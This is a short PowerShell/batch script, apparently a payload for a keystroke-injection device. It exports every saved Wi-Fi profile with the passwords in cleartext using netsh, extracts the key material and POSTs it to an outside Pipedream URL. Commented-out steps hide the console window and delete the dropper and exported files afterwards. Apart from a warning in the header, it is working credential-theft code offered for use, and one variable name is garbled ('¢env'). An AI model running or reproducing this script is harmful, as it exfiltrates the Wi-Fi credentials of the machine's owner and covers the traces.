#  DANGEROUS! Do not use unless you know what you're doing.

# Sends extracted keys to Pipedream (adjust the URL before use, or your credentials may leak!)
# Requires WiFi. Will send your WiFi credentials to Pipedream if found!

$uri = "https://eo75ckklbttuhhk.m.pipedream.net"

# Pre-exploitation Masking
# @echo off
# mode con:cols=30 lines=1

taskkill/im powershell.exe
cd ¢env:temp
netsh wlan export profile key=clear
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
powershell Invoke-WebRequest -Uri $uri -Method POST -InFile Wi-Fi-PASS

# Post-exploitation cleanup
# cd .. && cd .. && cd..
# del a.bat
# del wi*.xml /f /s /q
